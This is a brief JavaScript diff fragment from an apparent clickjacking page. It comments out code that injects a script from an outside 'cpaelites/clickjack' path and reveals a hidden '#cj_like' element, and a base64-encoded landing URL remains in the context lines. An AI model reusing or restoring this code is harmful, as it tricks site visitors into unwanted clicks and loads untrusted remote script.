@@ -94,7 +94,7 @@ var land = B64.decode("dXJsPXd3dy5maWxlcG9zdC5tbCZyZWZlcmVyPXd3dy5maWxlcG9zdC5tb
    // for other browsers
    window.onload = init;
    
-   var sc=document.createElement("script");
+/*   var sc=document.createElement("script");
    sc.src = "http://dvl-den.net/cpaelites/clickjack/js/jquery-cookie.min.js";
   
 document.getElementsByTagName("head")[0].appendChild(sc);
@@ -155,3 +155,4 @@ $(function () {
       $("#cj_like").show();
     }
   });
+  */
